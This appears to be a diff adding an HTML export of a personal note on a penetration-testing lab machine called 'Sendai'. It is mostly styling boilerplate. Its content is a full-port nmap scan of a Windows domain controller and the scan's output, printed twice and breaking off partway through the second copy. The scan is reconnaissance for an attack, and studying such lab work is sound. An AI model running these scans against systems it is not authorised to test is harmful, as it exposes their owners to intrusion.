@@ -1,0 +1,1680 @@
+
+				
+				<html>
+					<head>
+						<meta charset="UTF-8"/>
+						<meta name="viewport" content="width=device-width, initial-scale=1"/>
+						<style>pre code.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 1em;
+}
+
+code.hljs {
+  padding: 3px 5px;
+}
+
+/*
+
+Atom One Light by Daniel Gamage
+Original One Light Syntax theme from https://github.com/atom/one-light-syntax
+
+base:    #fafafa
+mono-1:  #383a42
+mono-2:  #686b77
+mono-3:  #a0a1a7
+hue-1:   #0184bb
+hue-2:   #4078f2
+hue-3:   #a626a4
+hue-4:   #50a14f
+hue-5:   #e45649
+hue-5-2: #c91243
+hue-6:   #986801
+hue-6-2: #c18401
+
+*/
+
+.hljs {
+  color: #383a42;
+  background: #fafafa;
+}
+
+.hljs-comment,
+.hljs-quote {
+  color: #a0a1a7;
+  font-style: italic;
+}
+
+.hljs-doctag,
+.hljs-keyword,
+.hljs-formula {
+  color: #a626a4;
+}
+
+.hljs-section,
+.hljs-name,
+.hljs-selector-tag,
+.hljs-deletion,
+.hljs-subst {
+  color: #e45649;
+}
+
+.hljs-literal {
+  color: #0184bb;
+}
+
+.hljs-string,
+.hljs-regexp,
+.hljs-addition,
+.hljs-attribute,
+.hljs-meta .hljs-string {
+  color: #50a14f;
+}
+
+.hljs-attr,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-type,
+.hljs-selector-class,
+.hljs-selector-attr,
+.hljs-selector-pseudo,
+.hljs-number {
+  color: #986801;
+}
+
+.hljs-symbol,
+.hljs-bullet,
+.hljs-link,
+.hljs-meta,
+.hljs-selector-id,
+.hljs-title {
+  color: #4078f2;
+}
+
+.hljs-built_in,
+.hljs-title.class_,
+.hljs-class .hljs-title {
+  color: #c18401;
+}
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+
+.hljs-link {
+  text-decoration: underline;
+}</style>
+						<title>Sendai</title>
+					</head>
+					<body>
+						<div class="exported-note"><div class="exported-note-title">Sendai</div>
+
+<style>
+		/* https://necolas.github.io/normalize.css/ */
+		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
+		article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}
+		pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}
+		b,strong{font-weight:bolder}small{font-size:80%}img{border-style:none}
+
+		body {
+			font-size: 15px;
+			color: #32373F;
+			word-wrap: break-word;
+			line-height: 1.6em;
+			background-color: #ffffff;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+			padding-bottom: 0px;
+			padding-top: 0px;
+		}
+		kbd {
+			border: 1px solid rgb(220, 220, 220);
+			box-shadow: inset 0 -1px 0 rgb(220, 220, 220);
+			padding: 2px 4px;
+			border-radius: 3px;
+			background-color: rgb(243, 243, 243);
+		}
+
+		:root {
+			--scrollbar-size: 7px;
+		}
+
+		::-webkit-scrollbar {
+			width: var(--scrollbar-size);
+			height: var(--scrollbar-size);
+		}
+		::-webkit-scrollbar-thumb {
+			border-radius: calc(var(--scrollbar-size) / 2);
+		}
+		::-webkit-scrollbar-corner {
+			background: none;
+		}
+		::-webkit-scrollbar-track {
+			border: none;
+		}
+		::-webkit-scrollbar-thumb {
+			background: rgba(50, 55, 63, 0.54); 
+		}
+		::-webkit-scrollbar-track:hover {
+			background: rgba(0, 0, 0, 0.1); 
+		}
+		::-webkit-scrollbar-thumb:hover {
+			background: rgba(50, 55, 63, 0.63); 
+		}
+
+		
+
+		/* Remove top padding and margin from first child so that top of rendered text is aligned to top of text editor text */
+
+		#rendered-md > h1:first-child,
+		#rendered-md > h2:first-child,
+		#rendered-md > h3:first-child,
+		#rendered-md > h4:first-child,
+		#rendered-md > ul:first-child,
+		#rendered-md > ol:first-child,
+		#rendered-md > table:first-child,
+		#rendered-md > blockquote:first-child,
+		#rendered-md > img:first-child,
+		#rendered-md > p:first-child {
+			margin-top: 0;
+			padding-top: 0;
+		}
+		
+		p, h1, h2, h3, h4, h5, h6, ul, table {
+			margin-top: .6em;
+			margin-bottom: 1.35em;
+
+			/*
+				Adds support for RTL text in the note body. It automatically detects the direction using the content.
+				Issue: https://github.com/laurent22/joplin/issues/3991
+			*/
+			unicode-bidi: plaintext;
+		}
+
+		h1, h2, h3, h4, h5, h6, ul, table {
+			margin-bottom: 0.65em;
+		}
+
+		h1, h2, h3, h4, h5, h6 {
+			line-height: 1.5em;
+		}
+		h1 {
+			font-size: 1.5em;
+			font-weight: bold;
+			border-bottom: 1px solid #dddddd;
+			padding-bottom: .3em;
+		}
+		h2 {
+			font-size: 1.3em;
+			font-weight: bold;
+			padding-bottom: .1em; */
+		}
+		h3 {
+			font-size: 1.1em;
+			font-weight: bold;
+		}
+		h4, h5, h6 {
+			font-size: 1em;
+			font-weight: bold;
+		}
+
+		.exported-note-title {
+			font-size: 2em;
+			font-weight: bold;
+			margin-bottom: 0.8em;
+			line-height: 1.5em;
+			padding-bottom: .35em;
+			border-bottom: 1px solid #dddddd;
+		}
+
+		a {
+			color: #155BDA;
+		}
+		ul, ol {
+			padding-left: 0;
+			margin-left: 1.7em;
+		}
+		li {
+			margin-bottom: .4em;
+		}
+		li p {
+			margin-top: 0.2em;
+			margin-bottom: 0;
+		}
+
+		dt {
+			font-weight: bold;
+			margin-bottom: 0.25em;
+		}
+
+		dd {
+			margin-inline-start: 2.5em;
+			margin-bottom: 0.5em;
+		}
+
+		.resource-icon {
+			display: inline-block;
+			position: relative;
+			top: 0.3em;
+			text-decoration: none;
+			width: 1.2em;
+			height: 1.4em;
+			margin-right: 0.4em;
+			background-color:  #155BDA;
+		}
+    /* These icons are obtained from the wonderful ForkAwesome project by copying the src svgs 
+     * into the css classes below.
+     * svgs are obtained from https://github.com/ForkAwesome/Fork-Awesome/tree/master/src/icons/svg
+     * instead of the svg width, height property you must use a viewbox here, 0 0 1536 1792 is typically the actual size of the icon
+     * each line begins with the pre-amble -webkit-mask: url("data:image/svg+xml;utf8,
+     * and of course finishes with ");
+     * to prevent artifacts it is also necessary to include -webkit-mask-repeat: no-repeat;
+     * on the following line
+     * */
+		.fa-joplin {
+			/* Awesome Font file */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M373.834 128C168.227 128 0 296.223 0 501.834v788.336C0 1495.778 168.227 1664 373.834 1664h788.336c205.608 0 373.83-168.222 373.83-373.83V501.834C1536 296.224 1367.778 128 1162.17 128zm397.222 205.431h417.424a7.132 7.132 0 0 1 7.132 7.133v132.552c0 4.461-3.619 8.073-8.077 8.073h-57.23c-24.168 0-43.768 19.338-44.284 43.374v2.377h-.017v136.191h-.053l-.466 509.375c-5.02 77.667-39.222 149.056-96.324 201.046-60.28 54.834-141.948 85.017-229.962 85.017-12.45 0-25.208-.61-37.907-1.785-92.157-8.682-181.494-48.601-251.662-112.438-71.99-65.517-117.147-150.03-127.164-238-11.226-98.763 23.42-192.783 95.045-257.937 81.99-74.637 198.185-101.768 316.613-75.704 5.574 1.227 9.55 6.282 9.55 11.997v199.52c-.199 2.625-1.481 6.599-8.183 2.896-.663-.365-1.194-.511-1.653-.531-21.987-10.587-45.159-17.57-68.559-19.916-.38-.04-.757-.124-1.138-.163-.537-.048-1.034-.033-1.556-.075-4.13-.354-8.183-.517-12.203-.58-.87-.011-1.771-.127-2.641-.127-.486 0-.951.05-1.437.057-1.464.011-2.886.115-4.33.163-2.76.102-5.497.211-8.182.448-.273.024-.547.07-.835.097-25.509 2.4-47.864 11.104-65.012 25.47-.954.802-1.974 1.53-2.9 2.36a1.34 1.34 0 0 1-.168.146c-23.96 21.8-34.881 53.872-30.726 90.316 4.62 40.737 26.94 81.156 62.841 113.823 35.908 32.67 80.335 52.977 125.113 57.186 35.118 3.36 66.547-3.919 89.899-20.461a97.255 97.255 0 0 0 9.365-7.501c2.925-2.661 5.569-5.5 8.086-8.416.3-.348.672-.673.975-1.024 8.253-9.864 14.222-21.067 17.996-33.148.639-2.034 1.051-4.148 1.564-6.227.381-1.563.81-3.106 1.112-4.693.555-2.784.923-5.632 1.253-8.49.086-.709.183-1.414.237-2.128.492-4.893.693-9.858.55-14.91h.013V521.623c-2.01-22.626-20.78-40.434-43.928-40.434h-57.23a8.071 8.071 0 0 1-8.077-8.073V340.564a7.132 7.132 0 0 1 7.136-7.133z'/></svg>");
+		}
+		.fa-file-image {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-128-448v320H256v-192l192-192 128 128 384-384zm-832-192c-106 0-192-86-192-192s86-192 192-192 192 86 192 192-86 192-192 192z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-pdf {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-514-593c25 20 53 38 84 56 42-5 81-7 117-7 67 0 152 8 177 49 7 10 13 28 2 52-1 1-2 3-3 4v1c-3 18-18 38-71 38-64 0-161-29-245-73-139 15-285 46-392 83-103 176-182 262-242 262-10 0-19-2-28-7l-24-12c-3-1-4-3-6-5-5-5-9-16-6-36 10-46 64-123 188-188 8-5 18-2 23 6 1 1 2 3 2 4 31-51 67-116 107-197 45-90 80-178 104-262-32-109-42-221-24-287 7-25 22-40 42-40h22c15 0 27 5 35 15 12 14 15 36 9 68-1 3-2 6-4 8 1 3 1 5 1 8v30c-1 63-2 123-14 192 35 105 87 190 146 238zm-576 411c30-14 73-57 137-158-75 58-122 124-137 158zm398-920c-10 28-10 76-2 132 3-16 5-31 7-44 2-17 5-31 7-43 1-3 2-5 4-8-1-1-1-3-2-5-1-18-7-29-13-36 0 2-1 3-1 4zm-124 661c88-35 186-63 284-81-10-8-20-15-29-23-49-43-93-103-127-176-19 61-47 126-83 197-15 28-30 56-45 83zm646-16c-5-5-31-24-140-24 49 18 94 28 124 28 9 0 14 0 18-1 0-1-1-2-2-3z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-word {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM233 768v107h70l164 661h159l128-485c5-15 8-30 10-46 1-8 2-16 2-24h4l3 24c3 14 4 30 9 46l128 485h159l164-661h70V768h-300v107h90l-99 438c-4 16-6 33-7 46l-2 21h-4c0-6-2-14-3-21-3-13-5-30-9-46L825 768H711l-144 545c-4 16-5 33-8 46l-4 21h-4l-2-21c-1-13-3-30-7-46l-99-438h90V768H233z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-powerpoint {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-992-234v106h327v-106h-93v-167h137c43 0 82-2 118-15 90-31 146-124 146-233s-54-193-137-228c-38-15-84-19-130-19H416v107h92v555h-92zm353-280H650V882h120c35 0 62 6 83 18 36 21 56 62 56 115 0 56-20 99-62 120-21 10-47 15-78 15z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-excel {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zm-979-234v106h281v-106h-75l103-161c12-19 18-34 21-34h2c1 4 3 7 5 10 4 8 10 14 17 24l107 161h-76v106h291v-106h-68l-192-273 195-282h67V768H828v107h74l-103 159c-12 19-21 34-21 33h-2c-1-4-3-7-5-10-4-7-9-14-17-23L648 875h76V768H434v107h68l189 272-194 283h-68z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-audio {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM620 850c12 5 20 17 20 30v544c0 13-8 25-20 30-4 1-8 2-12 2-8 0-16-3-23-9l-166-167H288c-18 0-32-14-32-32v-192c0-18 14-32 32-32h131l166-167c10-9 23-12 35-7zm417 689c19 0 37-8 50-24 83-102 129-231 129-363s-46-261-129-363c-22-28-63-32-90-10-28 23-32 63-9 91 65 80 100 178 100 282s-35 202-100 282c-23 28-19 68 9 90 12 10 26 15 40 15zm-211-148c17 0 34-7 47-20 56-60 87-137 87-219s-31-159-87-219c-24-26-65-27-91-3-25 24-27 65-2 91 33 36 52 82 52 131s-19 95-52 131c-25 26-23 67 2 91 13 11 29 17 44 17z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-video {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM768 768c70 0 128 58 128 128v384c0 70-58 128-128 128H384c-70 0-128-58-128-128V896c0-70 58-128 128-128h384zm492 2c12 5 20 17 20 30v576c0 13-8 25-20 30-4 1-8 2-12 2-8 0-17-3-23-9l-265-266v-90l265-266c6-6 15-9 23-9 4 0 8 1 12 2z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-archive {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M640 384V256H512v128h128zm128 128V384H640v128h128zM640 640V512H512v128h128zm128 128V640H640v128h128zm700-388c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H768v128H640V128H128v1536h1280zM781 943c85 287 107 349 107 349 5 17 8 34 8 52 0 111-108 192-256 192s-256-81-256-192c0-18 3-35 8-52 0 0 21-62 120-396V768h128v128h79c29 0 54 19 62 47zm-141 465c71 0 128-29 128-64s-57-64-128-64-128 29-128 64 57 64 128 64z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-code {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM480 768c11-14 31-17 45-6l51 38c14 11 17 31 6 45l-182 243 182 243c11 14 8 34-6 45l-51 38c-14 11-34 8-45-6l-226-301c-8-11-8-27 0-38zm802 301c8 11 8 27 0 38l-226 301c-11 14-31 17-45 6l-51-38c-14-11-17-31-6-45l182-243-182-243c-11-14-8-34 6-45l51-38c14-11 34-8 45 6zm-620 461c-18-3-29-20-26-37l138-831c3-18 20-29 37-26l63 10c18 3 29 20 26 37l-138 831c-3 18-20 29-37 26z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file-alt, .fa-file-csv {
+      /* fork-awesome doesn't have csv so we use the text icon */
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280zM384 800c0-18 14-32 32-32h704c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64zm736 224c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704zm0 256c18 0 32 14 32 32v64c0 18-14 32-32 32H416c-18 0-32-14-32-32v-64c0-18 14-32 32-32h704z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		.fa-file {
+			-webkit-mask: url("data:image/svg+xml;utf8,<svg viewBox='0 0 1536 1792' xmlns='http://www.w3.org/2000/svg'><path d='M1468 380c37 37 68 111 68 164v1152c0 53-43 96-96 96H96c-53 0-96-43-96-96V96C0 43 43 0 96 0h896c53 0 127 31 164 68zm-444-244v376h376c-6-17-15-34-22-41l-313-313c-7-7-24-16-41-22zm384 1528V640H992c-53 0-96-43-96-96V128H128v1536h1280z'/></svg>");
+      -webkit-mask-repeat: no-repeat;
+		}
+		blockquote {
+			border-left: 4px solid rgb(220, 220, 220);
+			padding-left: 1.2em;
+			margin-left: 0;
+			opacity: 0.7;
+		}
+
+		.jop-tinymce table,
+		table {
+			text-align: left;
+			border-collapse: collapse;
+			border: 1px solid rgb(220, 220, 220);
+			background-color: #ffffff;
+		}
+
+		.jop-tinymce table td, .jop-tinymce table th,
+		table td, th {
+			text-align: left;
+			padding: .5em 1em .5em 1em;
+			font-size: 15;
+			color: #32373F;
+			font-family: 'Avenir Next', 'Avenir', 'Arial', sans-serif;
+		}
+
+		.jop-tinymce table td,
+		table td {
+			border: 1px solid rgb(220, 220, 220);
+		}
+
+		.jop-tinymce table th,
+		table th {
+			border: 1px solid rgb(220, 220, 220);
+			border-bottom: 2px solid rgb(220, 220, 220);
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:nth-child(even),
+		table:has(thead) tr:nth-child(even) {
+			background-color: rgb(247, 247, 247);
+		}
+
+		.jop-tinymce table tr:hover,
+		table tr:hover {
+			background-color: #e5e5e5;
+		}
+
+		hr {
+			border: none;
+			border-bottom: 2px solid #dddddd;
+		}
+		img {
+			max-width: 100%;
+			height: auto;
+		}
+		
+		.inline-code,
+		.mce-content-body code {
+			border: 1px solid rgb(220, 220, 220);
+			background-color: rgb(243, 243, 243);
+			padding-right: .2em;
+			padding-left: .2em;
+			border-radius: .25em;
+			color: rgb(0,0,0);
+			font-size: .9em;
+		}
+
+		.highlighted-keyword {
+			background-color: #F3B717;
+			color: black;
+		}
+
+		
+	.not-loaded-resource img {
+		width: 1.15em;
+		height: 1.15em;
+		background: white;
+		padding: 2px !important;
+		border-radius: 2px;
+		box-shadow: 0 1px 3px #000000aa;
+	}
+
+	a.not-loaded-resource img {
+		margin-right: .2em;
+	}
+
+	a.not-loaded-resource {
+		display: flex;
+		flex-direction: row;
+		align-items: center;
+	}
+
+
+		.md-checkbox input[type=checkbox]:checked {
+			opacity: 0.7;
+		}
+
+		.jop-tinymce ul.joplin-checklist .checked,
+		.md-checkbox .checkbox-label-checked {
+			opacity: 0.5;
+		}
+
+		.exported-note {
+			padding: 1em;
+		}
+
+		.joplin-editable .joplin-source {
+			display: none;
+		}
+
+		mark {
+			background: #F7D26E;
+			color: black;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		.mce-content-body {
+			/* Note: we give a bit more padding at the bottom, to allow scrolling past the end of the document */
+			padding: 5px 10px 10em 0;
+		}
+
+		/*
+		.mce-content-body code {
+			background-color: transparent;
+		}
+		*/
+
+		.mce-content-body [data-mce-selected=inline-boundary] {
+			background-color: transparent;
+		}
+
+		.mce-content-body .joplin-editable {
+			cursor: pointer !important;
+		}
+
+		.mce-content-body.mce-content-readonly {
+			opacity: 0.5;
+		}
+
+		/* We need that to make sure click events have the A has a target */
+		.katex a span {
+			pointer-events: none;
+		}
+
+		.media-player {
+			width: 100%;
+			margin-top: 10px;
+		}
+
+		.media-player.media-pdf {
+			min-height: 35rem;
+			width: 100%;
+			max-width: 1000px;
+			margin: 0;
+			border: 0;
+			display: block;
+		}
+
+		/* Clear the CODE style if the element is within a joplin-editable block */
+		.mce-content-body .joplin-editable code {
+			border: none;
+			background: none;
+			padding: 0;
+			color: inherit;
+			font-size: inherit;
+		}
+
+		/* To make code blocks horizontally scrollable */
+		/* https://github.com/laurent22/joplin/issues/5740 */
+		pre.hljs {
+			overflow-x: auto;
+		}
+
+		.joplin-table-wrapper{
+			overflow-x: auto;
+			overflow-y: hidden;
+		}
+
+		/* =============================================== */
+		/* For TinyMCE */
+		/* =============================================== */
+
+		@media print {
+			body {
+				height: auto !important;
+			}
+
+			pre {
+				white-space: pre-wrap;
+			}
+
+			.code, .inline-code {
+				border: 1px solid #CBCBCB;
+			}
+
+			#joplin-container-content {
+				/* The height of the content is set dynamically by JavaScript (in updateBodyHeight) to go
+				   around various issues related to scrolling. However when printing we don't want this
+				   fixed size as that would crop the content. So we set it to auto here. "important" is
+				   needed to override the style set by JavaScript at the element-level. */
+				height: auto !important;
+			}
+		}
+	
+
+				/*
+					FOR THE MARKDOWN EDITOR
+				*/
+
+				/* Remove the indentation from the checkboxes at the root of the document
+				   (otherwise they are too far right), but keep it for their children to allow
+				   nested lists. Make sure this value matches the UL margin. */
+
+				li.md-checkbox {
+					list-style-type: none;
+				}
+
+				li.md-checkbox input[type=checkbox] {
+					margin-left: -1.71em;
+					margin-right: 0.7em;
+					position: relative;
+					top: 1px;
+				}
+				
+				ul.joplin-checklist {
+					list-style:none;
+				}
+
+				/*
+					FOR THE RICH TEXT EDITOR
+				*/
+
+				ul.joplin-checklist li::before {
+					content:"\f14a";
+					font-family:"Font Awesome 5 Free";
+					background-size: 16px 16px;
+					pointer-events: all;
+					cursor: pointer;
+					width: 1em;
+					height: 1em;
+					margin-left: -1.3em;
+					position: absolute;
+					color: #32373F;
+				}
+
+				.joplin-checklist li:not(.checked)::before {
+					content:"\f0c8";
+				}
+
+				.abc-notation-block svg {
+					background-color: white;
+				}
+			
+.mermaid { width: 640px; }
+pre.mermaid[data-processed=true] { white-space: unset; }
+.mermaid-export-graph {
+					opacity: 0;
+					height: 0;
+					z-index: 1;
+					position: relative;
+				} 
+				.joplin-editable:hover .mermaid-export-graph,
+				.joplin-editable .mermaid-export-graph:has(:focus-visible) {
+					opacity: 1;
+				}
+				.mermaid-export-graph > button:hover {
+					background-color: #CBDAF1 !important;
+				}</style><div id="rendered-md"><h2 id="sendai">Sendai</h2>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 10.129.234.66 -p- -Pn
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-06 10:56 -0500
+Nmap scan report for 10.129.234.66
+Host is up (0.012s latency).
+Not shown: 65517 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-06 16:00:29Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.sendai.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.sendai.vl
+| Not valid before: 2025-08-18T12:30:05
+|_Not valid after:  2026-08-18T12:30:05
+|_ssl-date: TLS randomness does not represent time
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc.sendai.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.sendai.vl
+| Not valid before: 2025-08-18T12:30:05
+|_Not valid after:  2026-08-18T12:30:05
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.sendai.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.sendai.vl
+| Not valid before: 2025-08-18T12:30:05
+|_Not valid after:  2026-08-18T12:30:05
+|_ssl-date: TLS randomness does not represent time
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=dc.sendai.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.sendai.vl
+| Not valid before: 2025-08-18T12:30:05
+|_Not valid after:  2026-08-18T12:30:05
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+53396/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+53397/tcp open  msrpc         Microsoft Windows RPC
+53412/tcp open  msrpc         Microsoft Windows RPC
+56185/tcp open  msrpc         Microsoft Windows RPC
+56207/tcp open  msrpc         Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
+OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
+Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-02-06T16:01:24
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+|_clock-skew: -1s
+
+TRACEROUTE (using port 135/tcp)
+HOP RTT      ADDRESS
+1   11.90 ms 10.10.14.1
+2   11.91 ms 10.129.234.66
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 314.89 seconds</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Sendai]
+&boxur;&boxh;$ sudo nmap -sS -sV -A 10.129.234.66 -p- -Pn
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-06 10:56 -0500
+Nmap scan report for 10.129.234.66
+Host is up (0.012s latency).
+Not shown: 65517 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-06 16:00:29Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sendai.vl, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.sendai.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:dc.sendai.vl
+| Not valid before: 2025-08-18T12:30:05
+|_Not valid after:  2026-08-18T12:30:05
+|_ssl-date: TLS randomness does not represent time
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
